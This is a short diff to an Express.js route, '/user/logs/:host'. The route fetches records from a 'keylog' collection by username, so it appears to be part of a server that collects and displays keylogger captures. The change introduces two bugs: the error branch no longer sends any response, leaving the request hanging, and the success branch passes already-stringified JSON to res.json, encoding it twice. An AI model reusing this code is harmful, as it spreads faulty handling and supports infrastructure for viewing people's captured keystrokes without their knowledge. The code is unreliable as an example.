@@ -70,11 +70,11 @@ router.get('/user/logs/:host', (req, res) => {
     console.log(req.params);
    keylog.find({username:req.params.host},(err,response)=>{
        if(err){
-           res.send("Error fetching key loggers data");
+           console.log("Error fetching key loggers data");
        }
        else{
            //console.log(response);
-           res.send(JSON.stringify(response));
+           res.json(JSON.stringify(response));
        }   
    })
 });
